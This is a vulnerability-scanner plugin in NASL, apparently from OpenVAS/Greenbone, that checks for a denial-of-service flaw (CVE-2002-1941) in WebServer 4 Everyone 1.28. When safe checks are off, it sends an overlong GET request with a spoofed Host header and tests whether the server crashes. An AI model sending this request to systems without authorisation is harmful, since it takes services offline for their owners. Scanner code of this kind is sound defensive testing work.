# SPDX-FileCopyrightText: 2002 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11167");
  script_version("2024-06-12T05:05:44+0000");
  script_tag(name:"last_modification", value:"2024-06-12 05:05:44 +0000 (Wed, 12 Jun 2024)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210208005345/http://www.securityfocus.com/bid/6034");
  script_cve_id("CVE-2002-1941");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("WebServer 4 Everyone 1.28 Host Field DoS Vulnerability");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2002 Michel Arboi");
  script_family("Gain a shell remotely");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("W4E/banner");
  script_exclude_keys("www/too_long_url_crash");

  script_tag(name:"summary", value:"WebServer 4 Everyone is prone to a denial of service (DoS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Depending on the 'safe_checks' setting of the scan
  configuration:

  - Setting 'yes': Checks if a vulnerable version is present on the target host

  - Setting 'no': Sends a crafted HTTP GET request and checks if the system is still responding
  afterwards");

  script_tag(name:"insight", value:"It may be possible to make WebServer 4 Everyone execute
  arbitrary code by sending it a too long url with the Host: field set to 127.0.0.1.");

  script_tag(name:"affected", value:"WebServer 4 Everyone version 1.28 is known to be affected.
  Other versions might be affected as well.");

  script_tag(name:"solution", value:"Update to the latest available version.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:80);

banner = http_get_remote_headers(port:port);
if(!banner || "WebServer 4 Everyone" >!< banner)
  exit(0);

if(safe_checks()) {
  if(egrep(string:banner, pattern:"WebServer 4 Everyone/1\.([01][0-9]?|2[0-8])")) {
    security_message(port:port);
    exit(0);
  }
  exit(99);
}

if(http_is_dead(port:port))
  exit(0);

if(!soc = http_open_socket(port))
  exit(0);

req = string("GET /", crap(2000), " HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n");
send(socket:soc, data:req);
http_close_socket(soc);

if(http_is_dead(port:port)) {
  security_message(port:port);
  set_kb_item(name:"www/too_long_url_crash", value:TRUE);
  exit(0);
}

exit(99);
